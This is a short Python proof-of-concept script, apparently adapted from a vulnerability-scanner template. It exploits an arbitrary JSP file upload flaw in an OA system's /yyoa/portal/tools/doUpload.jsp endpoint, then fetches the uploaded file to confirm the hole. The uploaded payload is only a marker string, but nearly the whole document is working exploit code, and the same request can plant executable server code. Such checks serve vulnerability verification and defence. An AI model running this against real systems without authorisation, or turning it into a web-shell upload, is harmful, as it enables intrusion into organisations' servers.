#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import time
import random
import io
import urllib3
import string

urllib3.disable_warnings()

# 生成随机8位字符串（相当于 {{rand_base(8)}}）
def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# 主函数
def verify(target_host):
    # 生成变量
    filename = generate_random_string(10).lower()  # {{to_lower(rand_base(10))}}
    boundary = generate_random_string(16)         # {{rand_base(16)}}

    # 第一个 POST 请求 - 文件上传
    url1 = f"{target_host}/yyoa/portal/tools/doUpload.jsp"
    headers1 = {
        "Content-Length": "298",
        "Origin": f"{target_host}",
        "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary{boundary}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Accept": "*/*",
        "Cookie": "JSESSIONID=1BDC1511726B24DF9B75FD554960F96A; JSESSIONID=0B4A41EA32B167EC5531DD0F78E4C10D",
        "Connection": "close"
    }

    # 构造 multipart/form-data 数据
    payload = (
        f"------WebKitFormBoundary{boundary}\r\n"
        f'Content-Disposition: form-data; name="myfile"; filename="{filename}.jsp"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
        "www.cnvd.org.cn\r\n"
        f"------WebKitFormBoundary{boundary}--\r\n"
    )

    try:
        response1 = requests.post(url1, headers=headers1, data=payload, timeout=10)
        body1 = response1.text
    except requests.RequestException as e:
        print(f"POST request failed: {e}")
        return False

    # 提取上传文件名 (13位数字+.txt)
    regex_pattern = r'(\d{13}\.jsp)'
    match = re.search(regex_pattern, body1)
    if not match:
        print("[-] Could not extract uploaded filename")
        return False
    jspuploadfilename = match.group(1)
    # 第二个 GET 请求 - 验证文件是否存在
    url2 = f"{target_host}/yyoa/portal/upload/{jspuploadfilename}"
    headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
    }

    try:
        response2 = requests.get(url2, headers=headers2, timeout=10)
        body2 = response2.text
    except requests.RequestException as e:
        print(f"GET request failed: {e}")
        return False

    # matcher 条件检查
    condition = (
        response2.status_code == 200 and
        "window.returnValue" in body1 and
        "www.cnvd.org.cn" in body2
    )

    if condition:
        print(f"[+] Vulnerability found! Uploaded file: {jspuploadfilename}")
        return url2
    else:
        print("[-] No vulnerability detected")
        return False
    
    
if __name__=="__main__":
    target = sys.argv[1]
    data = verify(target)
    if data:
        print("[+]漏洞存在，上传后的图片路径为：", data)
    else:
        print("[-]漏洞不存在")
